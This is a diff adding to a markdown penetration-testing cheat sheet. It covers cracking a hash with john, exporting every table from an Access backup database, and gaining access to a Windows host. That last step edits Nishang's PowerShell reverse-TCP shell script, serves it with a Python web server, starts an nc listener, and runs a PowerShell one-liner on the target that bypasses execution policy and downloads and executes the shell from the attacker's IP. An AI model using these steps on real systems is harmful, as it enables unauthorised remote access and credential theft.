@@ -40,5 +40,37 @@ john encriptedFile.hash --wordlist=possibleWordList -- show
 
 #### MDB handling
 13. mdb-sql backup.mdb
+
     |-list tables [list out all tables name in console]
+    
     |-go
+14. Export all table stored at the backup.mdb
+    
+    for i in $(mdb-tables backup.mdb);do mdb-export backup.mdb $i>tables/$i; done
+15. Counting the exported tables by line 
+  
+    wc -l * | sort -n
+    
+    
+## Step 2 Gain Access
+
+#### Preparing reverse tcp shell for windows
+-----------------------------
+##### Kali
+1) using this script /opt/nishang/shells/invoke-PowerShellTcp.ps1
+Change the reverse address 
+https://github.com/samratashok/nishang
+
+2) startup web server
+
+python -m SimpleHTTPServer
+
+3) nc -lvnp 9001
+
+##### Target Windows
+4) powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://<ip address>/invoke-PowerShellTcp.ps1')
+
+
+## Step 3 Getting target server information
+
+### Checking windows environment JAWS
